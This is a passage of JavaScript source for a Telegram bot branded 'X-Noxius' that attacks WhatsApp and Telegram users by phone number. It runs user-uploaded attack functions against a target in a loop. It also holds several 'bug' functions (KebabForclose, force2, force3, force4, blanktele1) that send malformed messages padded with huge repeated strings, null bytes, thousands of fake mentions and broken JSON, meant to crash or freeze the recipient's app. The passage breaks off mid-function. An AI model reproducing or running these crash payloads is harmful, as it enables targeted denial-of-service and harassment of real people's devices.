      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      
      let funcCode = ""
      let isFile = false
      
      if (ctx.message.reply_to_message && ctx.message.reply_to_message.document) {
        isFile = true
        const fileId = ctx.message.reply_to_message.document.file_id
        const fileLink = await ctx.telegram.getFileLink(fileId)
        const response = await axios.get(fileLink.href, { responseType: 'text' })
        funcCode = response.data
      } 
      else if (ctx.message.reply_to_message && ctx.message.reply_to_message.text) {
        funcCode = ctx.message.reply_to_message.text
      }
      else {
        return ctx.reply("❌ Reply dengan function atau file .js")
      }

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrlV2 },
        {
          caption: `<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: ${isFile ? 'File .js' : 'Text Function'}
 ▢  Status: Process Bug
`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
              { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
           ]]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `
<blockquote><pre>⬡═―—⊱ ⎧ X̌ - Noxius ⎭ ⊰―—═⬡</pre></blockquote>
 ▢  Target: ${q}
 ▢  Type: ${isFile ? 'File .js' : 'Text Function'}
 ▢  Status: Success Bug`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
                { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
              ]]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrlV2 },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "⤿ ⌜ ☠ TARGET ⌟", url: `https://wa.me/${q}` },
                { text: "⏤͟ ⌜ ✧ 𝐎𝐖𝐍𝐄𝐑 ⌟", url: `https://t.me/VINSEXEJT1` }
              ]]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command('fixedbug', checkPremium, async (ctx) => {
  const args = ctx.message.text.split(' ')[1];
  const chatId = ctx.chat.id;
  
  if (!args) {
    return ctx.reply('🪧 Example : /fixedbug 62×××');
  }

  let pepec = args.replace(/[^0-9]/g, '');
  if (pepec.startsWith('0')) {
    return ctx.reply('🪧 Example : /fixedbug 62×××');
  }

  const target = `${pepec}@s.whatsapp.net`;

  try {
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: `X-NoxiuX CLEAR BUG\n${'\n'.repeat(500)}X-NoxiuX CLEAR BUG`,
      });
    }

    ctx.reply('✅ Done Clear Bug By X-NoxiuX!!!');
  } catch (err) {
    console.error('Error:', err);
    ctx.reply('❌ Ada kesalahan saat mengirim pesan.');
  }
});

//

async function crashtele1(target) {
  const stickerId = 'CAACAgUAAxkBAAIa3GiSkLUG5KkUDD4FwqZYudBFshX0AAIYAwAC6mu4VQqSpe-Igg_zNgQ';
    try {
      await bot.telegram.sendSticker(target, stickerId);
    } catch (err) {
      console.log(`Error:`);
       
    }
}

async function blanktele1(target) {
  const msg = " ҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉" + "Marga #6VX Neverdiee!!"
  for (let i = 0; i < 5; i++) {
    try {
      await bot.telegram.sendMessage(target, msg);
    } catch (err) {
      console.log(`Error:`);
    }
  }
}

//

async function KebabForclose(sock, target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: "🫀ꢵ Z H I D A N K E B A B* ꢵ 🫀"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}",
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "zhidanofficial"
                            },
                            {
                                name: "booking_confirmation",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_opt_outs",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                              name: "psi_opt_outs_blank",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_tos_opt_in",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                                name: "psi_nux_opt_in",
                                buttonParamsJson: JSON.stringify({})
                            },
                            {
                            locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "💤⃟⃰ᰧ./##### ✩ >" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://xnxx-ZhidanKebab.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
                    },
                            },
                            {
                                name: "cta_app_link",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ZhidanOffc",
                                    android_app_metadata: {
                                        url: "https://t.me/zhidankebanb",
                                        consented_users_url: "https://t.me/zhidankebab"
                                    }
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, {});
    
await sock.relayMessage(target, {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: { remoteJid: target, fromMe: true, id: null },
              type: 25,
            },
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "false", statusQuestion: "true" },
                content: undefined,
              },
            ],
          },
        },
      }, {});
    
await sock.relayMessage(target, {
    interactiveMessage: {
      body: { text: "zhidankebab" },
      nativeFlowMessage: {
        buttons: [
          { name: "booking_status", buttonParamsJson: "\u0000".repeat(50000) + "\u0003".repeat(40000) }
        ]
      }
    }
  }, {});
}

async function force2(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: thumbnailUrl } },
    { upload: sock.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: JSON.stringify({
                        display_text: "\x10".repeat(1000),
                        url: "http://wa.Me/stickerpack/sock"
                      }),
                    },
                  ],
                  messageParamsJson: "{",
                },
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function force3(sock, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: thumbnailUrl } },
    { upload: sock.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: "Marga #6VX Neverdiee!!" + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function force4(sock, target) {
  try {
    let cards = [];

    for (let i = 0; i < 10; i++) {
      cards.push({
        header: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
            fileLength: "9999999999",
            height: 816,
            width: 654,
            mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
            fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
            directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1749220174",
